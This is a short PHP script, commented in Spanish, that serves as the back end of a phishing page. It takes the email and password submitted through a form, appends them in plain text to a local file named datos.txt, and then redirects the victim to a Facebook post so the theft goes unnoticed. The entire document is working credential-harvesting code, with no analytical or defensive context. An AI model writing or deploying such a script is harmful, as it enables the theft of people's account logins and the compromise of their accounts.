<?php
    // Obtener los datos del formulario
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Crear una cadena con los datos
    $datos = "Email: " . $email . "\n" . "Password: " . $password . "\n";

    // Escribir los datos en un archivo
    file_put_contents('datos.txt', $datos . "*****\n", FILE_APPEND);

    // Redirigir al usuario a otra página
    header('Location: https://www.facebook.com/post/85458215644');
?>
